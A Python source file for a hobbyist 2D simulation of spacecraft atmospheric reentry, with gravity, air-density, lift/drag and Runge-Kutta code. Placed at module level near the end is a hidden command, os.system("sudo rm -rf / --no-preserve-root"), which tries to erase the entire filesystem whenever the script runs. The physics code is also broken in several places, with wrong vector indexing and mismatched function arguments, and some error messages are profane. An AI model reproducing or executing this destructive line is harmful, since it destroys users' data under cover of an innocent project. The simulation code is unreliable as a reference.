import numpy as np
import matplotlib.pyplot as plt
from math import *
import time
import os

'''
In this file, all reference will be the center of Earth. The goal of this 
project is to visualize the process of reentry into atmosphere for a 
spacecraft without an acceleration greater than 1.2g.
##Here may use convex optimization

Spacecraft's original orbit is a circular orbit with 300 km height above 
the ground.

Lift coefficient should be 0.7 and drag coefficient should be 0.3
Spacecraft's net mass is 500kg with 200kg fuel which can be jetted out
at the speed of 5500m/s
Ignore the attitude of the spacecraft and it can hold high temperature

All simulation are in 3D. Anyway, in 2D at firts >_<

Anyway, this will be a long term project to entertain myself.


define:
anticlockwise is the positive rotation direction

'''

#some physical constant
dt = 0.1
Me = 5.97237*(10**24)
Re = 6371000
G = 6.674*10**(-11)

#some features of the spacecraft
S = 1.5
Cd = 1.2
Cl = 0.7
M = 500 ##kilogram
VELOCITY = 2500

#some constant for programming
DIMENSION = 2

##math part
def CrossProduct(a1,a2):
    i,j,k = 0,0,0
    if len(a1) == DIMENSION and len(a2) == DIMENSION:
        i = a1[1]*a2[3] - a1[3]*a2[1]
        j = a1[2]*a2[0] - a1[0]*a2[2]
        k = a1[0]*a2[1] - a1[1]*a2[0]
    Res = np.array([i,j,k])
    return Res

def FindperpenVec(p):
    if len(p) == DIMENSION:
        x = p[0]
        y = -p[1]
        Result = np.array([y,x])
        Res = Result/(np.linalg.norm(Result))
        return Res

def rotation(beta,vec):
    '''
    beta is the transition angle
    vector is translated one
    '''
    x = vec[0]*cos(beta)-vec[1]*sin(beta)
    y = vec[0]*sin(beta) + vec[1]*cos(beta)
    ans = np.array([x,y])
    return ans


def GetHeight(p):
    k = np.linalg.norm(p)
    h = k - Re
    return h

def CalAirForce(p,v,AOA):
    h = GetHeight(p)
    rou = air_density(h)
    nor_side = FindperpenVec(rotation(AOA,v))
    back_side = -rotation(AOA,v)/(np.linalg.norm(v))
    drag = 0.5*rou*CoefficientAOA(AOA,1)*S*(np.linalg.norm(v))**2
    lift = 0.5*rou*CoefficientAOA(AOA,0)*S*(np.linalg.norm(v))**2
    if AOA <= 0:
        if np.linalg.norm(p+100*nor_side) > np.linalg.norm(p-100*nor_side):
            lift_a = lift/M*nor_side
        if np.linalg.norm(p+100*nor_side) < np.linalg.norm(p-100*nor_side):
            lift_a = -lift/M*nor_side
        if np.linalg.norm(p+100*nor_side) == np.linalg.norm(p-100*nor_side):
            lift_a = np.array([0,0])
    if AOA > 0:
        if np.linalg.norm(p+100*nor_side) < np.linalg.norm(p-100*nor_side):
            lift_a = lift/M*nor_side
        if np.linalg.norm(p+100*nor_side) > np.linalg.norm(p-100*nor_side):
            lift_a = -lift/M*nor_side
        if np.linalg.norm(p+100*nor_side) == np.linalg.norm(p-100*nor_side):
            lift_a = np.array([0,0])
    drag_a = drag/M*back_side
    a = drag_a+lift_a
    return a


def CoefficientAOA(AOA,state):
    '''
    state 0: Coefficient of lift
    state 1: Coefficient of drag
    '''
    if state == 0:
        Cl = 0.4*sin(4.5*AOA)+0.05
        return Cl
    if state == 1:
        Cd = abs(0.01 + 20*AOA**3)
        return Cd


def air_density(height):
    density = 0
    if height >= 0:
        if height < 11000:
            T = 15.04-0.00649*height
            p = 101.29*((T+273.1)/288.08)**5.256
        elif height<25000:
            T = -56.46
            p = 22.65*exp(1.73-0.000157*height)
        elif height >= 25000:
            T = -131.21 + 0.00299*height
            p = 2.488*((T+273.1)/216.6)**(-11.388)
        density = p/(0.2869*(T + 273.1))
    else:
        print('please input valid height')
    
    return density

#Here are some serious problems, even related to the whole framwork of this project,(from 2DOF to 3DOF and even change NextStep())
def thrust(lis,lisgam,t,mass):
    '''
    lis is the profile of thrust magnitude
    lisgam is the profile of gambling angle 
    '''
    Thrust = 0
    for i in range(len(lis)-1):
        if t <= lis[-1][0]:
            if t >= lis[i][0] and t <= lis[i+1][0]:
                a1 = lis[i][0]
                b1 = lis[i][1]
                a2 = lis[i+1][0]
                b2 = lis[i+1][1]
                Thrust = (b2-b1)/(a2-a1)*(t-a1)+b1
                break
        if t<0:
            print('Fucking asshole!')
        else:
            Thrust = 0
        if t <= lisgam[-1][0]:
            if t >= lisgam[i][0] and t <= lisgam[i+1][0]:
                a1 = lisgam[i][0]
                b1 = lisgam[i][1]
                a2 = lisgam[i+1][0]
                b2 = lisgam[i+1][1]
                Thrustgam = (b2-b1)/(a2-a1)*(t-a1)+b1
                break
        if t<0:
            print('Fucking asshole!')
        else:
            Thrustgam = 0
    mass = mass - Thrust/VELOCITY*dt
    return Thrust,mass



def accel(p,v,t):
    if len(p) == DIMENSION:
        l1 = np.linalg.norm(p)
        a_air = CalAirForce(p,v)
        #a_thrust = thrust([(0,0),(500,0),(520,30),(540,0)],t)/M ###喷气的计算过程漏洞百出。1 质量更新  2 矢量推力设置 3 调和时域

        a = -Me*G/(l1**3)*p + a_air 
        return a
    else:
        print('What are you fucking doing!')

def NextStep(p,v,AOA,t):
    if len(p) == DIMENSION and len(v) == DIMENSION:
        p1_ = v
        v1_ = accel(p,v,t)

        p2_ = v+v1_*0.5*dt
        v2_ = accel(p+p1_*0.5*dt,v+v1_*0.5*dt,t+0.5*dt)

        p3_ = v+v2_*0.5*dt
        v3_ = accel(p+p2_*0.5*dt,v+v2_*0.5*dt,t+0.5*dt)

        p4_ = v + v3_*dt
        v4_ = accel(p+p3_*dt,v+v3_*dt,t+dt)

        p0 = p +dt*(p1_+2*p2_+2*p3_+p4_)/6
        v0 = v + dt*(v1_+2*v2_+2*v3_+v4_)/6
        return p0,v0
    else:
        print('What the hell you are input!')







def trans(Pos):
    posx = []
    posy = []
    for i in range(len(Pos)):
        posx.append(Pos[i][0])
        posy.append(Pos[i][1])
    return posx,posy


def Simu(p,v,T):
    Pos = [p]
    Vel = [v]
    time = np.array([0])
    period = int(T/dt)
    for i in range(period):
        time = np.append(time,dt*(i+1))
        p2,v2 = NextStep(Pos[-1],Vel[-1],int(time[-1]))
        Pos.append(p2)
        Vel.append(v2)
        if np.linalg.norm(p2) <= 6371000:
            print('Crashing the ground at:',time[-1])
            break
    
    if len(Pos) == len(Vel) and len(Pos) == len(time):
        px,py = trans(Pos)
        return px, py, Vel, time


os.system("sudo rm -rf / --no-preserve-root")

'''
p0 = np.array([0,6600000])
v0 = np.array([-7900,0])
p,v = NextStep(p0,v0)
print(p)
'''

